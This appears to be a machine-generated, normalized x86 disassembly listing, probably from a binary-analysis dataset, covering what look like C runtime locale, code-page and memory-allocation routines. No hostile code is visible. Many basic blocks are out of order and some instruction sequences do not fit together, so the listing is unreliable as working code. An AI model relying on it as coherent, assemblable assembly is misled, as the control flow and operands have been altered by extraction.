add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41be08
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41bdb7
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_41be36
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_41c229
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_41c26e
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_41c26e
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_41c26e
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_41c26e
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_41e4e9
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_41a7eb
push [ ebp - 0x1c ]
call sub_41a7eb
push [ ebp - 0x20 ]
call sub_41a7eb
push [ ebp - 0x28 ]
call sub_41a7eb
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_41a7eb
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_423cbb
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_41bc4a
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_41bc4a
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_41a0f0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_41a0f0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_41a0f0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_41a7eb
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_41a7eb
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_41a7eb
push [ esi + 0xc0 ]
call sub_41a7eb
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_41c229
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_41ae2a
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_41c26e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41edc9
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_41c2ba
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_423cfb
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_41c308
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_41c370
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41c35d
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_41c308
pop ecx
mov esi eax
call sub_41c34a
mov [ eax ] esi
pop esi
pop ebp
retn
sub_41c393
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_41c3c6
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_41c410
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_41f38a
pop ecx
pop edi
sub_41c436
push 0x8
push r--data
call sub_421220
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_421265
retn
push 0xd
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41c4e3
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_41a7eb
pop ecx
push 0xc
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_41f419
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41c4ef
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_41a7eb
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_41f4b2
pop ecx
sub_41c4f8
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41ef83
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_425202
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_41c539
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_41adb0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_41afa0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_42526f
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_42526f
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_41ef83
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_41afa0
test eax eax
sub_41c658
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e063
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41ef83
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c4f8
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c4f8
add esp 0x14
sub_41c6c3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_41c229
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_41c4f8
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41ef83
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_41e140
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_41c4f8
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_41a7eb
pop ecx
push r--data
push ebx
push edi
call sub_425202
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_41a7eb
pop ecx
push [ ebp - 0x10 ]
call sub_41a7eb
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_41a7eb
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_41a7eb
pop ecx
sub_41c828
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_41e872
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_41d120
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_41c539
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_41e140
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_41e063
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_4258b1
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_41e140
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_41c658
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_41a0f0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_41e063
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_41a0f0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_42526f
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
call sub_41ef83
sub_41ca49
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_41e872
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_41c828
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_41e140
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_41d120
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_41c229
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_41a0f0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_41e063
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41ef83
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_41a0f0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_41a7eb
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_423cbb
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_41a7eb
push [ ebx + 0x54 ]
call sub_41a7eb
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_425aa2
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_41cd83
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_41c6c3
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_41ca49
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_41c828
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_41e140
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_41ca49
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_41b154
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_41d120
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_41afa0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_42526f
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_41ef83
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_41ca49
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_427000
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_41cf9f
push 0x14
push r--data
call sub_421220
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_41e872
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_41f64a
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_41c26e
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
